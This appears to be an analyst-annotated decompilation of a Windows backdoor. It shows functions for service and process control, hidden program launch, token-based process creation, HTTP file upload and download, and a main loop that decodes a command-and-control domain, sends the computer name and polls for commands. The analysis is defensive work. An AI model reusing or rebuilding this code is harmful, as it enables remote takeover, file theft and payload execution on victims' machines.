    v5 = OpenSCManagerA(0, 0, 4u);              // And services are also enumerated
    hSCObject = v5;
    if ( !v5 )
      return strcat(a1, aListServiceFai);
    EnumServicesStatusExA(v5, SC_ENUM_PROCESS_INFO, 0x30u, 1u, 0, 0, &pcbBytesNeeded, &ServicesReturned, 0, 0);
    v6 = pcbBytesNeeded + 1;
    v7 = operator new(pcbBytesNeeded + 1);
    v20 = v7;
    if ( !v7 )
    {
      CloseServiceHandle(hSCObject);
      return strcat(a1, aListServiceFai);
    }
    EnumServicesStatusExA(
      hSCObject,
      SC_ENUM_PROCESS_INFO,
      0x30u,
      1u,
      (LPBYTE)v7,
      v6,
      &pcbBytesNeeded,
      &ServicesReturned,
      0,
      0);
    if ( ServicesReturned )
    {
      v8 = (const char **)v20;
      do
      {
        sprintf(Dest, "%-24s %s\r\n", *v8, v8[1]);
        strcat(a1, Dest);
        ++v1;
        v8 += 11;
      }
      while ( v1 < ServicesReturned );
    }
    operator delete(v20);
    return (char *)CloseServiceHandle(hSCObject);
  }
  return result;
}

//----- (00402132) --------------------------------------------------------
char *__cdecl sub_402132(char *Dest)
{
  char *result; // eax
  int v2; // eax
  HANDLE v3; // eax
  void *v4; // esi
  SC_HANDLE v5; // eax
  void *v6; // edi
  SC_HANDLE v7; // esi
  struct _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-20h] BYREF
  BOOL v9; // [esp+28h] [ebp-4h]

  if ( !lpServiceName )
    return strcat(Dest, aSyntaxErrorU_0);
  if ( strcmpi(aP, Str) )
  {
    result = (char *)strcmpi(aS, Str);
    if ( !result )
    {
      v5 = OpenSCManagerA(0, 0, 4u);            // This just looks at service status
      v6 = v5;
      if ( v5 )
      {
        v7 = OpenServiceA(v5, lpServiceName, 0xF003Fu);
        if ( v7 )
        {
          if ( ControlService(v7, 1u, &ServiceStatus) )
          {
            switch ( ServiceStatus.dwCurrentState )
            {
              case 1u:
                strcat(Dest, aServiceStopped);
                break;
              case 3u:
                strcat(Dest, aServiceStopPen);
                break;
              case 4u:
                strcat(Dest, aServiceStillRu);
                break;
            }
          }
          else if ( GetLastError() == 1062 )
          {
            strcat(Dest, aServiceDoesnTS);
          }
          else
          {
            strcat(Dest, aControlservice);
          }
          CloseServiceHandle(v7);
          return (char *)CloseServiceHandle(v6);
        }
        else
        {
          if ( GetLastError() == 1060 )
            strcat(Dest, aServiceDoesNot);
          else
            strcat(Dest, aOpenserviceFai);
          return (char *)CloseServiceHandle(v6);
        }
      }
      else
      {
        return strcat(Dest, aOpenscmanagerF);
      }
    }
  }
  else
  {
    v2 = atoi(lpServiceName);                   // This terminates the service
    v3 = OpenProcess(0x1F0FFFu, 0, v2);
    v4 = v3;
    if ( v3 != (HANDLE)-1 )
    {
      v9 = TerminateProcess(v3, 1u);
      CloseHandle(v4);
    }
    if ( v9 )
      return strcat(Dest, aOk);
    else
      return strcat(Dest, aFailed);
  }
  return result;
}

//----- (00402292) --------------------------------------------------------
int __stdcall StartAddress(char *lpThreadParameter)
{
  int v1; // esi
  _BYTE *v2; // esi
  char *v3; // eax
  HANDLE FileA; // eax
  int v5; // edi
  DWORD FileSize; // eax
  DWORD v7; // edi
  DWORD v8; // eax
  int v9; // eax
  char Str[256]; // [esp+Ch] [ebp-290h] BYREF
  CHAR FileName[260]; // [esp+10Ch] [ebp-190h] BYREF
  char v13[64]; // [esp+210h] [ebp-8Ch] BYREF
  LPCSTR v14[10]; // [esp+250h] [ebp-4Ch] BYREF
  DWORD FileSizeHigh; // [esp+278h] [ebp-24h] BYREF
  BOOL v16; // [esp+27Ch] [ebp-20h]
  LPCVOID lpBuffer; // [esp+280h] [ebp-1Ch]
  int v18; // [esp+284h] [ebp-18h]
  HANDLE hFile; // [esp+288h] [ebp-14h]
  DWORD NumberOfBytesRead; // [esp+28Ch] [ebp-10h] BYREF
  int v21; // [esp+298h] [ebp-4h]
  int Dest; // [esp+2A4h] [ebp+8h]

  v18 = 0;
  sub_40101C((int)v14, szReferrer, aMozilla5_0, szReferrer, szReferrer, 1, 60000);
  v21 = 0;
  if ( !Buffer )                                // BUT DOES THIS MALWARE ACTUALLY WORK?
  {
    strcat(lpThreadParameter, aSyntaxErrorU_3);
    v1 = 0;
    goto LABEL_54;
  }
  v2 = operator new(0x200C8u);
  lpBuffer = v2;
  *v2 = 0;
  if ( v2 )
  {
    if ( !strcmpi(Str2, aPutf) )                // This is the getF branch
      v18 = 1;
    strcpy(FileName, ::Str);
    if ( v18 )
    {
      v3 = strrchr(::Str, 92);
      if ( v3 )
        strcpy(FileName, v3 + 1);
      FileA = CreateFileA(FileName, 0x40000000u, 1u, 0, 2u, 0x80u, 0);
    }
    else
    {
      FileA = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
    }
    hFile = FileA;
    if ( FileA != (HANDLE)-1 )
    {
      if ( v18 )
      {
        v5 = atoi(String);
        goto LABEL_17;
      }
      FileSize = GetFileSize(hFile, &FileSizeHigh);
      v5 = FileSize;
      if ( FileSize != -1 && !FileSizeHigh )
      {
        sprintf(v13, "FileSize:\t%d", FileSize);
LABEL_17:
        sscanf(Buffer, "%*[^/]%*[/]%*[^/]%s", Str);
        sub_401199((void **)v14, dword_404794);
        sub_4011DE((void **)v14, Str);
        if ( !v18 )
          sub_401280((void **)v14, v13);
        if ( sub_4010C0(v14) )
        {
          Dest = v5;
          while ( 1 )
          {
            sub_4013CC((HINTERNET *)v14);
            if ( !sub_4010C0(v14) )
            {
              sub_4013CC((HINTERNET *)v14);
              goto LABEL_49;
            }
            NumberOfBytesRead = 0;
            v7 = 0x20000;
            if ( !v18 )
            {
              v8 = 0x20000;
              if ( Dest <= 0x20000 )
                v8 = Dest;
              Dest -= v8;
              ReadFile(hFile, v2, v8, &NumberOfBytesRead, 0);// READ
            }
            v16 = sub_4012C5(v14, v2, NumberOfBytesRead);
            if ( v16 )
            {
              if ( v18 )
                break;
            }
LABEL_45:
            if ( Dest <= 0 || !v16 )
              goto LABEL_49;
          }
          if ( Dest <= 0x20000 )
            v7 = Dest;
          while ( 1 )
          {
            v16 = sub_40138F((HINTERNET *)v14, v2, v7, &NumberOfBytesRead);
            if ( strstr(v2, SubStr) )
              break;
            v9 = 0;
            if ( NumberOfBytesRead > 3 )
            {
              while ( v2[v9] != 13 || v2[v9 + 1] != 10 || v2[v9 + 2] != 13 || v2[v9 + 3] != 10 )
              {
                if ( ++v9 + 3 >= NumberOfBytesRead )
                  goto LABEL_41;
              }
              if ( v9 + 4 == NumberOfBytesRead )
              {
                NumberOfBytesRead = 0;
              }
              else
              {
                v2[NumberOfBytesRead] = 0;
                NumberOfBytesRead += -4 - v9;
                lpBuffer = &v2[v9 + 4];
              }
            }
LABEL_41:
            if ( v16 )
            {
              v7 = NumberOfBytesRead;
              WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesRead, 0);// WRITE
            }
            Dest -= v7;
            lpBuffer = v2;
            if ( !NumberOfBytesRead || !v16 )
              goto LABEL_45;
          }
        }
      }
    }
LABEL_49:
    if ( lpBuffer )
      operator delete(v2);
  }
  if ( hFile != (HANDLE)-1 )
    CloseHandle(hFile);
  v1 = 1;
LABEL_54:
  v21 = -1;
  sub_401078((HINTERNET *)v14);
  return v1;
}
// 402292: using guessed type char Str[256];

//----- (004025A2) --------------------------------------------------------
BOOL __cdecl sub_4025A2(char *Dest, HINTERNET *a2, HANDLE hFile)
{
  unsigned int v3; // ebx
  char *Desta; // [esp+14h] [ebp+8h]

  v3 = 0;
  if ( shell_is_running )
  {
    strcat(Dest, aShellStartedWa);
    sub_40199F(aExit, hFile);
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
    shell_is_running = 0;
    strcat(Dest, aOk_0);
  }
  strcat(Dest, aSoLong);
  Desta = (char *)strlen(Dest);
  sub_4013CC(a2);
  do
  {
    if ( sub_4010C0((LPCSTR *)a2) )
      break;
    sub_4013CC(a2);
    ++v3;
    Sleep(0xEA60u);
  }
  while ( v3 < 5 );
  return sub_4012C5(a2, Dest, (DWORD)Desta);
}
// 4047A0: using guessed type int shell_is_running;

//----- (00402645) --------------------------------------------------------
char *__cdecl sub_402645(char *Dest)
{
  char *result; // eax
  SC_HANDLE v2; // eax
  void *v3; // ebx
  SC_HANDLE v4; // eax
  void *v5; // edi
  struct _STARTUPINFOA Dst; // [esp+Ch] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+50h] [ebp-10h] BYREF

  if ( !lpServiceName )
    return strcat(Dest, aSyntaxErrorU_1);
  if ( strcmpi(aP, Str) )
  {
    result = (char *)strcmpi(aS, Str);
    if ( !result )
    {
      v2 = OpenSCManagerA(0, 0, 4u);
      v3 = v2;
      if ( v2 )
      {
        v4 = OpenServiceA(v2, lpServiceName, 0xF003Fu);
        v5 = v4;
        if ( v4 )
        {
          if ( StartServiceA(v4, 0, 0) )
          {
            strcat(Dest, aServiceStarted);
          }
          else if ( GetLastError() == 1056 )
          {
            strcat(Dest, aServiceIsRunni);
          }
          else
          {
            strcat(Dest, aStartserviceFa);
          }
          CloseServiceHandle(v5);
          return (char *)CloseServiceHandle(v3);
        }
        else
        {
          if ( GetLastError() == 1060 )
            strcat(Dest, aServiceDoesNot);
          else
            strcat(Dest, aStartserviceFa);
          return (char *)CloseServiceHandle(v3);
        }
      }
      else
      {
        return strcat(Dest, aOpenscmanagerF);
      }
    }
  }
  else
  {
    memset(&Dst, 0, sizeof(Dst));
    Dst.cb = 68;
    Dst.wShowWindow = 0;
    Dst.dwFlags = 1;
    if ( CreateProcessA(0, (LPSTR)lpServiceName, 0, 0, 1, 0, 0, 0, &Dst, &ProcessInformation) )
      strcat(Dest, aProgramStarted);
    else
      strcat(Dest, aCreateprocessF);
    CloseHandle(ProcessInformation.hProcess);
    return (char *)CloseHandle(ProcessInformation.hThread);
  }
  return result;
}

//----- (004027A8) --------------------------------------------------------
char *__cdecl sub_4027A8(char *Dest)
{
  __int32 v1; // eax

  if ( !lpServiceName || !Str )
    return strcat(Dest, aSyntaxError);
  v1 = atol(Str);
  return (char *)sub_402817(Dest, lpServiceName, v1);
}

//----- (004027E6) --------------------------------------------------------
char *__cdecl sub_4027E6(char *Dest)
{
  if ( Str && lpServiceName )
    return (char *)URLDownloadToFileA(0, Str, lpServiceName, 0, 0);
  else
    return strcat(Dest, aSyntaxErrorU_2);
}

//----- (00402817) --------------------------------------------------------
int __cdecl sub_402817(char *a1, const char *a2, DWORD dwProcessId)
{
  HANDLE CurrentProcess; // eax
  DWORD LastError; // eax
  DWORD v6; // eax
  DWORD v7; // eax
  CHAR CommandLine[260]; // [esp+4h] [ebp-260h] BYREF
  char Dest[256]; // [esp+108h] [ebp-15Ch] BYREF
  struct _STARTUPINFOA Dst; // [esp+208h] [ebp-5Ch] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+24Ch] [ebp-18h] BYREF
  int v12; // [esp+25Ch] [ebp-8h]
  HANDLE TokenHandle; // [esp+260h] [ebp-4h] BYREF
  void *dwProcessIda; // [esp+274h] [ebp+10h]

  v12 = 0;
  if ( dwProcessId )
    CurrentProcess = OpenProcess(0x1F0FFFu, 0, dwProcessId);
  else
    CurrentProcess = GetCurrentProcess();
  dwProcessIda = CurrentProcess;
  if ( CurrentProcess == (HANDLE)-1 )
  {
    LastError = GetLastError();
    sprintf(Dest, "Failed with %d!\n", LastError);
    strcat(a1, Dest);
    return 0;
  }
  else
  {
    if ( OpenProcessToken(CurrentProcess, 0xBu, &TokenHandle) )
    {
      memset(&Dst, 0, sizeof(Dst));
      Dst.cb = 68;
      Dst.dwFlags = 1;
      Dst.wShowWindow = 0;
      sprintf(CommandLine, "\"%s\"", a2);
      if ( CreateProcessAsUserA(TokenHandle, 0, CommandLine, 0, 0, 1, 0, 0, 0, &Dst, &ProcessInformation) )
      {
        strcat(a1, aOk_1);
        CloseHandle(ProcessInformation.hProcess);
        CloseHandle(ProcessInformation.hThread);
        v12 = 1;
      }
      else
      {
        v6 = GetLastError();
        sprintf(Dest, "Create failed with %d!\n", v6);
        strcat(a1, Dest);
      }
      CloseHandle(TokenHandle);
    }
    else
    {
      v7 = GetLastError();
      sprintf(Dest, "Failed with %d!\n", v7);
      strcat(a1, Dest);
    }
    CloseHandle(dwProcessIda);
    return v12;
  }
}

//----- (0040297D) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  void *v4; // edi
  DWORD v6; // ecx
  _BYTE *v7; // eax
  char Dest[36]; // [esp+Ch] [ebp-28h] BYREF
  DWORD nSize; // [esp+30h] [ebp-4h] BYREF

  nSize = strlen(aCsfSCR);
  v4 = operator new(nSize + 1);
  if ( !v4 )
    return 1;
  memset(v4, 0, nSize + 1);
  v6 = 0;
  if ( nSize )
  {
    v7 = v4;
    do
    {
      ++v6;
      *v7 = ((char)v7[aCsfSCR - (_BYTE *)v4] >> 1) & 0x7F;
      ++v7;
    }
    while ( v6 < nSize );
  }                                             // At this point, string is: "stratos.mcafeepaying.com".
                                                // This is the command and control endpoint.
  nSize = 35;
  Dest[0] = 47;                                 // This is a slash
  if ( !GetComputerNameA(&Dest[1], &nSize) )
    Dest[0] = 0;                                // If GetComputerName fails, name becomes null string
  strcat(Dest, asc_4046C4);                     // Append the rest of the referrer string (Mozilla, etc.)
  while ( !dword_4047A4 )                       // Keep going until told to quit by C&C
  {
    sub_401406((char *)v4, ::Dest, Dest, (char *)1);// Pass URL and try to get commands to execute
    if ( dword_4047A4 )
      break;
    Sleep(60000 * dword_4046B4);                // Sleep before asking for another command.  
                                                // Default sleep time is 2 hours (7200 seconds)
  }
  return 0;
}
// 4046B4: using guessed type int dword_4046B4;
// 4047A4: using guessed type int dword_4047A4;

//----- (00402C2C) --------------------------------------------------------
int sub_402C2C()
{
  return 0;
}

// nfuncs=48 queued=28 decompiled=28 lumina nreq=0 worse=0 better=0
// ALL OK, 28 function(s) have been successfully decompiled
